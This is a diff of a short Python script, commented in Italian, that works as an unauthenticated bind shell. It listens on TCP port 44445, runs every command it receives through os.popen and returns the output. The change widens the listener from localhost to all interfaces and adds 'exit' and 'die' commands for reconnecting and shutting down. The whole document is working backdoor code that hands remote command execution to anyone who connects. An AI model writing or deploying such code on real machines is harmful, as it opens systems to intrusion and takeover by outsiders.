@@ -1,6 +1,6 @@
 import socket as so
 import os
-SRV_ADDR = "127.0.0.1"
+SRV_ADDR = ""
 SRV_PORT = 44445
 
 # creando un oggetto che gestice la connessione in ipv4 e tcp
@@ -37,10 +37,17 @@ while True:
     # print(comando)
     if comando.startswith("cd "):
         os.chdir(comando.split(" ")[1])
+    elif comando.startswith("exit"):
+        #chiude la connessione e ne apre un altra
+        connection.close()
+        connection, address = s.accept()
+    elif comando.startswith("die"):
+        break
     else:
         esegui = os.popen(comando).read().rstrip('\n')
         connection.sendall(esegui.encode() + "\n".encode())
 
 connection.close()
+s.close()
 
 
